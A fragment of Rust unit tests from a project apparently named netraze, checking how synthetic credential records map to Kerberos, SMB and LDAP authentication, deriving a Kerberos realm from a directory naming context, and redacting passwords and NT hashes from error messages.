    fn converts_kerberos_aes_keys_without_accepting_them_for_smb_or_ldap() {
        let credential = CredentialRecord {
            username: "alice".to_owned(),
            domain: "EXAMPLE.TEST".to_owned(),
            secret: "11".repeat(32),
            cred_type: CredType::Aes256Key,
            ..anonymous_record()
        };
        assert!(matches!(
            cred_to_kerberos(&credential),
            Ok(netraze_protocols::kerberos::KerberosCredential::Aes256Key(
                _
            ))
        ));
        assert!(cred_to_smb(&credential).is_err());
        assert!(cred_to_ldap_auth(&credential).is_err());
    }

    #[test]
    fn derives_uppercase_realm_from_default_naming_context() {
        let mut inventory = netraze_core::DirectoryInventory::default();
        inventory.server.default_naming_context = "DC=example,DC=test".to_owned();
        assert_eq!(
            realm_from_inventory(&inventory).as_deref(),
            Some("EXAMPLE.TEST")
        );
    }

    #[test]
    fn ldap_auth_distinguishes_anonymous_guest_and_named_credentials() {
        use netraze_protocols::ldap::LdapAuthentication;
        use netraze_protocols::ntlm::NtlmCredential;

        assert!(matches!(
            cred_to_ldap_auth(&anonymous_record()),
            Ok(LdapAuthentication::Anonymous)
        ));

        let guest = CredentialRecord {
            username: "Guest".to_owned(),
            domain: "EXAMPLE".to_owned(),
            ..anonymous_record()
        };
        assert!(matches!(
            cred_to_ldap_auth(&guest),
            Ok(LdapAuthentication::Ntlm {
                username,
                domain,
                credential: NtlmCredential::Password(password),
            }) if username == "Guest" && domain == "EXAMPLE" && password.is_empty()
        ));

        let named_without_secret = CredentialRecord {
            username: "alice".to_owned(),
            ..anonymous_record()
        };
        assert!(cred_to_ldap_auth(&named_without_secret).is_err());

        let anonymous_with_secret = CredentialRecord {
            secret: "test-only-secret".to_owned(),
            ..anonymous_record()
        };
        assert!(cred_to_ldap_auth(&anonymous_with_secret).is_err());
    }

    #[test]
    fn runtime_errors_redact_passwords_and_hashes() {
        assert_eq!(
            redact_secret("bind rejected test-only-password", "test-only-password"),
            "bind rejected <redacted>"
        );
        let hash = synthetic_nt_hash_hex();
        let error = format!("hash {} rejected", hash.to_ascii_uppercase());
        assert_eq!(redact_secret(&error, &hash), "hash <redacted> rejected");
    }
}
